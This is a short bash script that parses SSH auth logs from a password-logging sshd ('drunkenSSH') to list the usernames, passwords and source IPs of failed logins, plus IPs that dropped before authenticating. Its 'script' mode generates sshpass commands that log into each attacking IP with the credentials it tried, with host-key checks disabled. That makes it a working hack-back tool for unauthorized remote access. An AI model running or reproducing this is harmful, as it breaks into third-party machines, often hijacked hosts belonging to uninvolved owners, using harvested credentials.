#!/bin/bash

case "$1" in
	"attempts")
		cat /var/log/auth.log | awk -F ":" '{print $4}' | grep "Failed password" | awk '{for(i=3; i < NF-2;i++){printf $i " "}print ""}' | awk -F " " '{if(NF>3)print $(NF-2) " " $1 " " $NF}'
	;;
	"scanner")
		cat /var/log/auth.log | grep "[preauth]"       | grep -Po "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort | uniq
	;;
	"script")
		#list attempts
		./$0 attempts |
		#generate commands
		awk '{ print "echo \""$3"\"\nsshpass -p \""$2"\" ssh -o UserKnownHostsFile=/dev/null -o \"LogLevel ERROR\" -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -F /dev/null "$1"@"$3" \" \""}'
	;;
	*)
		echo "shows list of failed sshd login attempts"
		echo "	usage: $0 {attempts|scanner|script}"
		echo "		attempts (requires drunkenSSH as sshd): show list of <user> <password> <ip> with failed login attempt"
		echo "		scanner: show list of IP4 with disconnect before login"
		echo "		script: generates a callback script using ssh and sshpass"
	;;
esac
